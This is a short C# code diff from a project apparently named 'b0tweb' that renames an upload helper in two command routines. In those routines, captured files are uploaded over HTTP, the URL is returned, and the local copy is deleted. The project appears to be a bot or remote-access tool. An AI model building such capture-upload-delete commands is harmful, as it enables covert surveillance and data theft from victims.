@@ -45,7 +45,7 @@ namespace b0tweb.Commands
 
             capture.Dispose();
 
-            string url = HTTPUpload.Upload(path);
+            string url = HTTPHelper.Upload(path);
             FileHelper.DeleteFile(path);
 
             return url;
@@ -81,7 +81,7 @@ namespace b0tweb.Commands
             writer.Dispose();
             capture.Dispose();
 
-            string url = HTTPUpload.Upload(path);
+            string url = HTTPHelper.Upload(path);
 
             FileHelper.DeleteFile(path);
 
